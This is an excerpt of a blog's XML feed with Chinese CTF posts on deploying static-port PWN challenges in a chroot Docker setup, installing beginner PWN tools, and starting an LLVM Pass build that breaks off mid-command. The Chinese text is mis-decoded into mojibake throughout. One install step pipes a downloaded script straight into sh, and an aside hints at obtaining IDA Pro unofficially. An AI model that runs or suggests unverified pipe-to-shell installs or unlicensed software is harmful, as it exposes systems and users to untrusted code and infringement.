    <title>å¦‚ä½•å®‰å…¨å¿«é€Ÿéƒ¨ç½²å¤šé“é™æ€ç«¯å£PWNé¢˜ç›®</title>
    <link href="/2022/09/12/%E9%9D%99%E6%80%81pwn/"/>
    <url>/2022/09/12/%E9%9D%99%E6%80%81pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>æœ¬æ–‡éƒ¨åˆ†å¼•ç”¨åˆå¤©ç½‘å®‰å®éªŒå®¤å¾®ä¿¡æ–‡ç« ï¼ŒåŸæ–‡é“¾æ¥ï¼š<a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652848854&idx=1&sn=ff537cc73e76e1ab058bd36cb76749a0&chksm=bd593e1b8a2eb70d41627a1d04c1abec2c071f28c2649ddd9e313c4eda854ca4a26db20a1985&mpshare=1&scene=1&srcid=1011dGXhepYahcla33btEWte#rd">å¦‚ä½•å®‰å…¨å¿«é€Ÿåœ°éƒ¨ç½²å¤šé“ ctf pwn æ¯”èµ›é¢˜ç›® (qq.com)</a></p></blockquote><p>æˆ‘ä»¬å¹³æ—¶è§åˆ°çš„å¤šæ•°PWNé¢˜ï¼Œæ˜¯é‡‡ç”¨åŠ¨æ€ç«¯å£ï¼ŒåŠ¨æ€flagï¼Œè¿™ç§å½¢å¼åœ¨ä¸€å®šç¨‹åº¦ä¸Šå‡å°‘äº†æ¯”èµ›ä¸­pyçš„æ•°é‡ã€‚å³ä¾¿æœ‰ï¼Œä¹Ÿæ˜¯æ€è·¯pyï¼Œè€Œä¸æ˜¯ç›´æ¥ä¼ é€’flagï¼Œæå‡äº†pyçš„é—¨æ§›ã€‚ä½†æœ‰æ—¶å—é™äºç¯å¢ƒåŠæœåŠ¡å™¨è´Ÿæ‹…åŸå› ï¼Œè¢«è¿«é‡‡ç”¨é™æ€ç«¯å£çš„PWNä¹Ÿä¸åœ¨å°‘æ•°æ¯”å¦‚<a href="https://pwnable.tw/challenge/">pwnable.tw</a>ä»¥åŠæ˜Ÿç›Ÿçš„<a href="http://pwn.eonew.cn/challenge.php">challenge (eonew.cn)</a></p><p>2022å¹´çš„æ‹›æ–°ä¾¿æ˜¯å¦‚æ­¤ï¼Œç”±äºç–«æƒ…è¢«è¿«çº¿ä¸Šä¸Šè¯¾ï¼Œçº¿ä¸Šå®‰æ’æ¯”èµ›ï¼Œæ— æ³•ä½¿ç”¨æ ¡å†…çš„æœåŠ¡å™¨èµ„æºã€‚å—é™äºè‡ªèº«æœåŠ¡å™¨çš„æ€§èƒ½ï¼Œåªå¥½é‡‡å–å¦‚æ­¤ä¸‹ç­–ï¼ˆä½†è¿˜å¥½åªæ˜¯æ‹›æ–°ï¼Œ11æœˆçš„DUTCTFå¸Œæœ›èƒ½æœ‰å¥½ç‚¹çš„èµ„æº&#x2F;(ã„’oã„’)&#x2F;~~ï¼‰</p><p>ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜</p><p><img src="/img/article/static_port/image-20220912135756313.png" alt="å¯æ€œçš„å­¦å§"></p><p>ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜ğŸ†˜</p><p>å¹¸è¿çš„æ˜¯æ‰¾åˆ°äº†åˆå¤©åœ¨2018å¹´åˆ›å»ºçš„é¡¹ç›®<code>pwn_depoly_chroot</code>ï¼Œå¯ä»¥éå¸¸æ–¹ä¾¿çš„æ­å»ºå¤šä¸ªé™æ€é¢˜ç›®ï¼Œä¸”æ¯”è¾ƒå®‰å…¨ï¼Œç”¨äºè¿™ç§å°å‹æ¯”èµ›ä»¥åŠæ™®é€šçš„è®­ç»ƒé¢˜åº“éƒ½éå¸¸åˆé€‚ã€‚</p><h2 id="pwn-depoly-chrooté¡¹ç›®ä»‹ç»"><a href="#pwn-depoly-chrooté¡¹ç›®ä»‹ç»" class="headerlink" title="pwn_depoly_chrooté¡¹ç›®ä»‹ç»"></a>pwn_depoly_chrooté¡¹ç›®ä»‹ç»</h2><blockquote><p>åŸé¡¹ç›®é“¾æ¥ï¼š<a href="https://github.com/giantbranch/pwn_deploy_chroot">Github: pwn_depoly_chroot</a></p></blockquote><ul><li><p>ä¸€æ¬¡å¯ä»¥éƒ¨ç½²å¤šä¸ªé¢˜ç›®åˆ°ä¸€ä¸ª <code>docker</code> å®¹å™¨ä¸­</p></li><li><p>è‡ªåŠ¨ç”Ÿæˆ flag,å¹¶å¤‡ä»½åˆ°å½“å‰ç›®å½•(ä¸è¿‡éœ€æ³¨æ„æ˜¯é™æ€çš„flag)</p></li><li><p>åŸºäº <code>xinted + docker + chroot</code></p></li><li><p>åˆ©ç”¨ python è„šæœ¬æ ¹æ® PWN çš„æ–‡ä»¶åè‡ªåŠ¨åŒ–åœ°ç”Ÿæˆ 3 ä¸ªæ–‡ä»¶ï¼š<code>pwn.xinetd</code>ï¼Œ<code>Dockerfile</code> å’Œ <code>docker-compose.yml</code></p></li><li><p>åœ¨ &#x2F;bin ç›®å½•ï¼Œåˆ©ç”¨è‡ªå·±ç¼–å†™çš„é™æ€ç¼–è¯‘çš„ <code>catflag</code> ç¨‹åºä½œä¸º <code>/bin/sh</code>ï¼Œè¿™æ ·çš„è¯ï¼Œ<code>system(&quot;/bin/sh&quot;)</code> å®é™…æ‰§è¡Œçš„åªæ˜¯è¯»å– flag æ–‡ä»¶çš„å†…å®¹ï¼Œå®Œå…¨ä¸ç»™æ…å±æ£ä»»ä½•æ“ä½œçš„ä½™åœ°</p></li><li><p>é»˜è®¤ä» 10000 ç«¯å£ç›‘å¬ï¼Œå¤šä¸€ä¸ªç¨‹åºå°± +1ï¼Œèµ·å§‹çš„ç›‘å¬ç«¯å£å¯ä»¥åœ¨ <code>config.py</code> é…ç½®ï¼Œæˆ–è€…ç”Ÿæˆ <code>pwn.xinetd å’Œ docker-compose.yml</code> åè‡ªå·±ä¿®æ”¹è¿™ä¸¤ä¸ªæ–‡ä»¶</p></li></ul><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#å®‰è£…docker</span><br>$ curl -s https://get.docker.com/ | sh<br><br><span class="hljs-comment">#å®‰è£… docker compose å’Œ git</span><br>$ apt install docker-compose git<br><br><span class="hljs-comment">#ä¸‹è½½PWNé¢˜æ­å»ºé¡¹ç›®</span><br>$ git <span class="hljs-built_in">clone</span> https://github.com/giantbranch/pwn_deploy_chroot.git<br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨æ•™å­¦"><a href="#ä½¿ç”¨æ•™å­¦" class="headerlink" title="ä½¿ç”¨æ•™å­¦"></a>ä½¿ç”¨æ•™å­¦</h2><p>åªéœ€è¦ 3 æ­¥ï¼š</p><ol><li>å°†æ‰€æœ‰ pwn é¢˜ç›®æ”¾å…¥ bin ç›®å½•ï¼ˆæ³¨æ„åå­—ä¸å¸¦ç‰¹æ®Šå­—ç¬¦ï¼Œå› ä¸ºä¼šå°†æ–‡ä»¶åä½œä¸º linux ç”¨æˆ·åï¼‰</li><li>python initialize.py  </li><li>docker-compose up â€“build -d</li></ol><h3 id="è¯¦ç»†æ“ä½œï¼š"><a href="#è¯¦ç»†æ“ä½œï¼š" class="headerlink" title="è¯¦ç»†æ“ä½œï¼š"></a>è¯¦ç»†æ“ä½œï¼š</h3><ul><li><strong>å°†ä½ è¦éƒ¨ç½²çš„ pwn é¢˜ç›®æ”¾åˆ° bin ç›®å½•</strong></li></ul><p>è¿™ä¸ªé¡¹ç›®å·²ç»å°†ä¸€ä¸ªç¨‹åº copy äº† 3 ä»½ä½œä¸ºç¤ºä¾‹ï¼Œæ³¨æ„æ–‡ä»¶åä¸è¦å«æœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œæ–‡ä»¶åå»ºè®®ä½¿ç”¨å­—æ¯ï¼Œä¸‹åˆ’çº¿ï¼Œæ¨ªæ†å’Œæ•°å­—ï¼Œå½“ç„¶å…¨å­—æ¯çš„å½“ç„¶æœ€å¥½äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@instance-1:~/pwn_deploy_chroot<span class="hljs-comment"># ls bin/</span><br>pwn1 pwn1_copy1 pwn1_copy2<br></code></pre></td></tr></table></figure><ul><li><strong>è¿è¡Œ initialize.py</strong></li></ul><p>è¿è¡Œè„šæœ¬åä¼šè¾“å‡ºæ¯ä¸ª pwn çš„ç›‘å¬ç«¯å£ï¼Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@instance-1:~/pwn_deploy_chroot<span class="hljs-comment"># python initialize.py</span><br><br>pwn1<span class="hljs-string">&#x27;s port: 10000</span><br><span class="hljs-string">pwn1_copy1&#x27;</span>s port: 10001<br>pwn1_copy2<span class="hljs-string">&#x27;s port: 10002</span><br></code></pre></td></tr></table></figure><p>æ–‡ä»¶ä¸ç«¯å£ä¿¡æ¯ï¼Œè¿˜æœ‰éšæœºç”Ÿæˆçš„ flag é»˜è®¤å¤‡ä»½åˆ° flags.txt </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@instance-1:~/pwn_deploy_chroot<span class="hljs-comment"># cat flags.txt </span><br>pwn1: flag&#123;93aa6da5-db45-46fa-a2e1-af2be6698692&#125;<br>pwn1_copy1: flag&#123;f9966c51-52e4-4212-ac44-97bf16620b41&#125;<br>pwn1_copy2: flag&#123;b17949ce-e3fa-4ca7-9fcc-44b8dc997cb3&#125;<br><br>pwn1<span class="hljs-string">&#x27;s port: 10000</span><br><span class="hljs-string">pwn1_copy1&#x27;</span>s port: 10001<br>pwn1_copy2<span class="hljs-string">&#x27;s port: 10002</span><br></code></pre></td></tr></table></figure><ul><li><strong>å¯åŠ¨ç¯å¢ƒ</strong></li></ul><p>è¯·ä½¿ç”¨ root ç”¨æˆ·æ‰§è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up --build-d<br></code></pre></td></tr></table></figure><p>ä¸å‡ºæ„å¤–ï¼Œé¢˜ç›®å°±å¯åŠ¨èµ·æ¥äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@instance-1:~/pwn_deploy_chroot<span class="hljs-comment"># netstat -antp | grep docker</span><br>tcp6       0     0:::10002               :::*                   LISTEN      19828/docker-proxy<br>tcp6       0     0:::10000               :::*                   LISTEN      19887/docker-proxy<br>tcp6       0     0:::10001               :::*                   LISTEN      19873/docker-proxy<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ pwn1,çœ‹çœ‹æ•ˆæœ</p><p><img src="/img/article/static_port/20220912141715.png" alt="æµ‹è¯•ç¤ºä¾‹"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè™½ç„¶æ‰§è¡Œçš„æ˜¯ <code>system(&quot;/bin/sh&quot;)</code>ï¼Œä½†æ˜¯å®é™…åŠŸèƒ½åªæ˜¯è¾“å‡º flagï¼Œè¿™æ ·å°±éå¸¸å®‰å…¨äº†</p><h3 id="å¦å¤–"><a href="#å¦å¤–" class="headerlink" title="å¦å¤–"></a>å¦å¤–</h3><blockquote><p>å¦‚æœ‰äºŒæ¬¡å¼€å‘æ„æ„¿æˆ–æƒ³äº†è§£æ›´å¤šè¯¦ç»†å†…å®¹ï¼Œå¯è‡ªè¡ŒæŸ¥çœ‹å¼€å¤´çš„æ–‡ç« é“¾æ¥æˆ–githubé¡¹ç›®é“¾æ¥ï¼Œå†…æœ‰éƒ¨åˆ†å…³é”®ä»£ç è®²è§£</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PWNç¯å¢ƒæ­å»ºï¼ˆèŒæ–°å…¥é—¨ï¼‰</title>
    <link href="/2022/09/05/%E8%90%8C%E6%96%B0%E6%89%8B%E5%86%8C-PWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/09/05/%E8%90%8C%E6%96%B0%E6%89%8B%E5%86%8C-PWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="IDA-PRO-åæ±‡ç¼–åˆ©å™¨"><a href="#IDA-PRO-åæ±‡ç¼–åˆ©å™¨" class="headerlink" title="IDA PRO-åæ±‡ç¼–åˆ©å™¨"></a>IDA PRO-åæ±‡ç¼–åˆ©å™¨</h2><blockquote><p>æ¨èç‰ˆæœ¬7.6åŠä»¥ä¸Šï¼Œé«˜ç‰ˆæœ¬å¢æ·»äº†å¯¹äºgoè¯­è¨€ç¨‹åºçš„åæ±‡ç¼–ï¼Œå¯»æ‰¾èµ„æºéœ€è¦è°¨æ…å“¦</p><p>å†™æ–‡ç« çš„æ—¶å€™é¡ºä¾¿çœ‹äº†çœ¼ä»·æ ¼ï¼Œï¼Œï¼Œï¼Œï¼Œç®—äº†è¿˜æ˜¯è‡ªå·±æ‰¾èµ„æºå§</p></blockquote><p><img src="/img/article/pwn-envir/image-20220905153059189-1662367638683-2.png" alt="image-20220905153059189"></p><p>IDAå¯ä»¥å¯¹å¯æ‰§è¡Œç¨‹åºåæ±‡ç¼–æ“ä½œï¼Œèƒ½å¤Ÿçœ‹åˆ°æ•´ä¸ªç¨‹åºçš„æ¡†æ¶ã€æ±‡ç¼–ä»£ç ã€ä¼ªä»£ç ã€å‡½æ•°è°ƒç”¨ã€ä»¥åŠä¸€äº›å­—ç¬¦ä¸²çš„å…¨å±€éå˜é‡ã€‚æ— è®ºå¯¹äºReverseè¿˜æ˜¯PWNéƒ½æ˜¯æœ€æ ¸å¿ƒçš„å·¥å…·ä¹‹ä¸€ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘æ”¾åœ¨æœ€å‰é¢æåŠçš„åŸå› ï¼Œå¤§æ¦‚ç•Œé¢å¦‚ä¸‹å›¾ã€‚</p><p><img src="/img/article/pwn-envir/image-20220905153323145.png" alt="image-20220905153323145"></p><h2 id="Linuxå‘è¡Œç‰ˆé€‰æ‹©"><a href="#Linuxå‘è¡Œç‰ˆé€‰æ‹©" class="headerlink" title="Linuxå‘è¡Œç‰ˆé€‰æ‹©"></a>Linuxå‘è¡Œç‰ˆé€‰æ‹©</h2><p>è¿™é‡Œæˆ‘ä¸»è¦æ¨èUbuntuï¼Œç›¸æ¯”äºå…¶ä»–å‘è¡Œç‰ˆï¼ŒUbuntuçš„å›¾å½¢åŒ–ç•Œé¢æ¯”è¾ƒæ–¹ä¾¿æ–°äººå…¥æ‰‹å­¦ä¹ Linux. å¦å¤–ä¸€æ–¹é¢ï¼ŒCTFä¸­å¤§å¤šæ•°PWNé¢˜ç¯å¢ƒéƒ½æ˜¯åœ¨ubuntuä¸‹çš„ï¼Œä¸€èˆ¬ä¸ºè¿‘å‡ å¹´çš„ç‰ˆæœ¬ã€‚</p><blockquote><p>ä»¥2022å¹´PWNé¢˜ç›®ç¯å¢ƒä¸ºä¾‹ï¼ŒUbuntuç‰ˆæœ¬åŸºæœ¬é›†ä¸­åœ¨Ubuntu18ï¼ŒUbuntu20ï¼ŒUbuntu22. åŒç†åœ¨2024å¹´ï¼Œä¸å‡ºæ„å¤–çš„è¯é¢˜ç›®ç¯å¢ƒå°†ä¼šå˜åŒ–ä¸ºUbuntu20ï¼ŒUbuntu22ï¼ŒUbuntu24. ä¸»è¦æ˜¯å› ä¸ºUbuntuå‘è¡Œä¸ºLTSåˆ¶(Long Term Support)å³ç‰ˆæœ¬æ”¯æŒå¹´ä»½ä¸º6å¹´ï¼Œä¸”æ¯ä¸¤å¹´å‘å¸ƒä¸€æ¬¡æ–°ç‰ˆæœ¬</p></blockquote><p>é‚£ä¹ˆåœ¨é€‰æ‹©æ—¶å°±æ¨èé€‰æ‹©è·ç¦»æ—¶é—´æœ€è¿‘çš„å¶æ•°å¹´ä»½ç‰ˆæœ¬ï¼Œæ¯”å¦‚Ubuntu20æˆ–22. Ubuntuç³»ç»Ÿçš„isoé•œåƒæ–‡ä»¶å¯ä»¥è‡ªè¡Œåœ¨ç½‘ä¸Šå¯»æ‰¾ï¼Œä¹Ÿå¯ä»¥åœ¨å¤§å·¥é•œåƒç½‘ç«™ä¸‹è½½ï¼š<a href="http://mirror.dlut.edu.cn/ubuntu-releases/22.04/">å¤§è¿ç†å·¥å¤§å­¦å¼€æºè½¯ä»¶é•œåƒç«™ (dlut.edu.cn)</a></p><p><img src="/img/article/pwn-envir/image-20220905164622966.png" alt="image-20220905164622966"></p><p>è™šæ‹Ÿæœºå®‰è£…Windowsç¯å¢ƒä¸‹å»ºè®®ä½¿ç”¨VMwareã€‚åŒæ ·å»ºè®®ç‰ˆæœ¬å°½é‡æ–°ä¸€äº›ï¼Œå¦‚VM16ä»¥ä¸Šï¼Œè¿™æ ·å¯ä»¥é¿å…ä¸€éƒ¨åˆ†çš„è“å±BUGå‘ç”Ÿã€‚</p><blockquote><p>Linuxå®‰è£…æ•™å­¦ä¸åœ¨è¿™é‡Œèµ˜è¿°äº†ï¼Œæ¯•ç«Ÿæœ¬æ–‡çš„æ ¸å¿ƒæ˜¯PWNç¯å¢ƒçš„æ­å»ºï¼Œå¦‚éœ€å®‰è£…çš„ç›¸å…³èµ„æºï¼Œå¯è‡ªè¡Œç½‘ç»œæœç´¢</p></blockquote><h2 id="Pwntoolså®‰è£…"><a href="#Pwntoolså®‰è£…" class="headerlink" title="Pwntoolså®‰è£…"></a>Pwntoolså®‰è£…</h2><p>Ubuntuå®‰è£…å®Œæˆåé»˜è®¤åº”è¯¥æ˜¯æœ‰python3çš„ï¼Œå¯ä»¥ç”¨python -Væˆ–python3 -Væ¥æŸ¥çœ‹ç‰ˆæœ¬</p><p><img src="/img/article/pwn-envir/image-20220905161539363.png" alt="image-20220905161539363"></p><blockquote><p>è¿™é‡Œæ¨èä½¿ç”¨python3, è™½ç„¶æœ‰äººè¯´Pwntoolså¯¹äºpython2çš„é€‚é…æ€§æ›´å¥½ï¼Œä½†ç”±äºpython2è¿‡äºå¤è€ï¼Œæ–°ç‰ˆæœ¬åå€’åœ¨å…¶ä»–æ–¹é¢æ›´åŠ ç¨³å®šä¸€äº›ã€‚åœ¨æ‹¥æœ‰å…¶ä»–æ›´å¤šæ’ä»¶å’ŒåŒ…çš„æƒ…å†µä¸‹ï¼Œä¸ªäººæ„Ÿè§‰è¿˜æ˜¯python3æ›´ä¼˜ä¸€äº›ã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-get update<br>$ sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential<br>$ sudo python3 -m pip install --upgrade pip<br>$ sudo python3 -m pip install --upgrade pwntools<br></code></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>import pwn</code>æ¥æµ‹è¯•ä¸€äº›æ˜¯å¦æˆåŠŸå®‰è£…,å‡ºç°ä¸‹æ–¹æƒ…å†µåŸºæœ¬å°±å¯ä»¥äº†</p><p><img src="/img/article/pwn-envir/image-20220905162034730.png" alt="image-20220905162034730"></p><h2 id="pwndbg-amp-pwngdbå®‰è£…"><a href="#pwndbg-amp-pwngdbå®‰è£…" class="headerlink" title="pwndbg &amp; pwngdbå®‰è£…"></a>pwndbg &amp; pwngdbå®‰è£…</h2><p>è¿™ä¸¤ä¸ªå‡æ˜¯GDBçš„æ’ä»¶ä¹‹ä¸€ï¼Œç”¨äºåœ¨Linuxå¯¹ç¨‹åºè¿›è¡ŒåŠ¨æ€è°ƒè¯•ï¼Œè€ŒåŠ¨æ€è°ƒè¯•ä¹Ÿæ˜¯PWNæœ€æ ¸å¿ƒçš„éƒ¨åˆ†ä¹‹ä¸€ã€‚æ‹¥æœ‰è¿™äº›å·¥å…·ï¼Œæˆ‘ä»¬èƒ½æ›´åŠ æ–¹ä¾¿çš„æŸ¥çœ‹ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå†…å­˜å˜åŒ–ã€‚å¦‚æ ˆã€å †ã€å¯„å­˜å™¨ç­‰ç­‰åœ°æ–¹çš„å†…å®¹ã€‚</p><blockquote><p>pwndbgå®‰è£…</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg<br><span class="hljs-built_in">cd</span> pwndbg<br>./setup.sh<br></code></pre></td></tr></table></figure><blockquote><p>pwngdbå®‰è£…</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/<br>git <span class="hljs-built_in">clone</span> https://github.com/scwuaptx/Pwngdb.git <br><span class="hljs-built_in">cp</span> ~/Pwngdb/.gdbinit ~/<br></code></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼šä¸Šè¿°ä¸¤ä¸ªæ’ä»¶å¹¶ä¸å…¼å®¹ï¼Œä½†å¯ä»¥é€šè¿‡æ›´æ”¹.gdbinitæ–‡ä»¶åˆ‡æ¢ä½¿ç”¨</p><p>.gdbinitæ–‡ä»¶é…ç½®å¦‚ä¸‹</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">source /home/pwnki/pwndbg/gdbinit.<span class="hljs-property">py</span> <br>#source ~<span class="hljs-regexp">/peda/</span>peda.<span class="hljs-property">py</span> <span class="hljs-comment">//ä½¿ç”¨ pwndbg å°±è¦æŠŠ peda æ³¨é‡Šæ‰ï¼Œåè¿‡æ¥ä¹Ÿä¸€æ ·</span><br>source ~<span class="hljs-regexp">/Pwngdb/</span>pwngdb.<span class="hljs-property">py</span><br>source ~<span class="hljs-regexp">/Pwngdb/</span>angelheap/gdbinit.<span class="hljs-property">py</span><br><br>define hook-run<br>python<br><span class="hljs-keyword">import</span> angelheap<br>angelheap.<span class="hljs-title function_">init_angelheap</span>()<br>end<br>end<br></code></pre></td></tr></table></figure><p><img src="/img/article/pwn-envir/image-20220905165859512.png" alt="image-20220905165859512"></p><h2 id="checksecå®‰è£…"><a href="#checksecå®‰è£…" class="headerlink" title="checksecå®‰è£…"></a>checksecå®‰è£…</h2><p>ç”¨äºæ£€æµ‹ç¨‹åºå¼€å¯äº†å“ªäº›ä¿æŠ¤æœºåˆ¶ï¼Œå¾€å¾€æ˜¯PWNè§£é¢˜çš„ç¬¬ä¸€æ­¥ï¼Œå®‰è£…æ–¹å¼ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt install checksec<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨æ–¹å¼:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ checksec ç¨‹åºæ–‡ä»¶<br></code></pre></td></tr></table></figure><p><img src="/img/article/pwn-envir/image-20220905164504590.png" alt="image-20220905164504590"></p><h2 id="æ›´å¤šæ’ä»¶"><a href="#æ›´å¤šæ’ä»¶" class="headerlink" title="æ›´å¤šæ’ä»¶"></a>æ›´å¤šæ’ä»¶</h2><blockquote><p>è™½ç„¶è¿˜æœ‰å¾ˆå¤šæ’ä»¶å¹¶æ²¡æœ‰æåŠï¼Œä½†å¯¹äºåˆšåˆšæ¥è§¦pwnçš„åŒå­¦æ¥è¯´ï¼Œä»¥ä¸Šæ’ä»¶å·²ç»å¤Ÿå®Œæˆä¸€éƒ¨åˆ†ç®€å•çš„pwné¢˜ç›®ï¼Œæ›´å¤šçš„æ’ä»¶éœ€è¦åœ¨å°†æ¥è‡ªå·±å­¦ä¹ çš„è¿‡ç¨‹ä¸­æ…¢æ…¢è¡¥å……ã€‚ä¸‹é¢åªåšä¸€åˆ—ä¸¾ï¼Œæœ‰å…´è¶£çš„åŒå­¦å¯ä»¥è‡ªè¡Œæœç´¢æŸ¥çœ‹</p></blockquote><h3 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h3><blockquote><p>å¯ä»¥ç”¨äºä¸‹è½½å„ç§ç‰ˆæœ¬çš„glibcæ–‡ä»¶ï¼Œåœ¨æœ¬åœ°æ¨¡æ‹Ÿå…¶ä»–libcç¯å¢ƒæ—¶éå¸¸å®ç”¨</p></blockquote><h3 id="seccomp-tools"><a href="#seccomp-tools" class="headerlink" title="seccomp-tools"></a>seccomp-tools</h3><blockquote><p>ç”¨äºæ£€æµ‹ç¨‹åºæ²™ç›’é˜²æŠ¤å¼€å¯æƒ…å†µï¼Œå¾€å¾€åœ¨ä¸€äº›ä¼šç”¨åˆ°ORWç­‰æ–¹æ³•è§£é¢˜æ—¶ä¼šç”¨æ¥æ£€æµ‹</p></blockquote><h3 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h3><blockquote><p>è¿™ä¸ªå·¥å…·å¯ä»¥ç”¨æŸ¥æ‰¾libcä¸­å¯ä»¥ç”¨æ¥getshellçš„ç‰‡æ®µåœ°å€ï¼Œåœ¨å„ç±»é¢˜ç›®ä¸­éƒ½åº”ç”¨å¹¿æ³›</p></blockquote><h3 id="LibcSeacher"><a href="#LibcSeacher" class="headerlink" title="LibcSeacher"></a>LibcSeacher</h3><blockquote><p>è¯¥å·¥å…·å¾€å¾€ç”¨äºç¡®å®šlibcç‰ˆæœ¬å¹¶ç¡®å®šå…¶libcç‰ˆæœ¬ä¸‹çš„å‡½æ•°åç§»ï¼Œå¯ä»¥è¢«ç½‘é¡µç«¯çš„libcåº“æ›¿ä»£</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>LLVM PASSç¯å¢ƒæ­å»ºä¸åŸºæœ¬ä½¿ç”¨</title>
    <link href="/2022/06/30/LLVM%20Pass%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/06/30/LLVM%20Pass%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="LLVM-Pass-ç¯å¢ƒæ­å»º"><a href="#LLVM-Pass-ç¯å¢ƒæ­å»º" class="headerlink" title="LLVM Pass ç¯å¢ƒæ­å»º"></a>LLVM Pass ç¯å¢ƒæ­å»º</h2><h3 id="é¢„ç¼–è¯‘åŒ…çš„å®‰è£…"><a href="#é¢„ç¼–è¯‘åŒ…çš„å®‰è£…" class="headerlink" title="é¢„ç¼–è¯‘åŒ…çš„å®‰è£…"></a>é¢„ç¼–è¯‘åŒ…çš„å®‰è£…</h3><p>åœ¨Ubuntuä¸Šï¼Œå¯ä»¥ç›´æ¥é€šè¿‡<code>apt</code>å®‰è£…llvmå’Œclangï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt install llvm<br>$ sudo apt install clang<br></code></pre></td></tr></table></figure><h3 id="ç¼–è¯‘å®‰è£…"><a href="#ç¼–è¯‘å®‰è£…" class="headerlink" title="ç¼–è¯‘å®‰è£…"></a>ç¼–è¯‘å®‰è£…</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> llvm-project<br>$ <span class="hljs-built_in">mkdir</span> build &amp;&amp; <span class="hljs-built_in">cd</span> build<br>$ cmake -G <span class="hljs-string">&quot;Unix Makefiles&quot;</span> -DLLVM_ENABLE_PROJECTS=<span class="hljs-string">&quot;clang&quot;</span> \<br>    -DCMAKE_BUILD_TYPE=Release -DLLVM_TARGETS_TO_BUILD=<span class="hljs-string">&quot;X86&quot;</span> \<br>    -DBUILD_SHARED_LIBS=On ../llvm<br>$ 